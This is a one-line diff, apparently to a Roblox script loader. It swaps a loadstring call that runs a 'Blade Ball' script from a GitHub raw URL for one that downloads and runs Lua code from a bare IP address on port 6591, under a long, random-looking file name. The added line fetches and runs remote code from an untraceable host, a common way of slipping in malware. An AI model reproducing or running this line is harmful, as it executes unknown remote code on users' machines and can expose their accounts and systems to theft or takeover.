@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CodeE4X-dev/Star-X/refs/heads/main/Blade-BallV3"))()
+loadstring(game:HttpGet("http://67.220.85.182:6591/e238e283eu238irhehjshdshdf8e028372084082374893748570287320710824708734208374.lua"))()
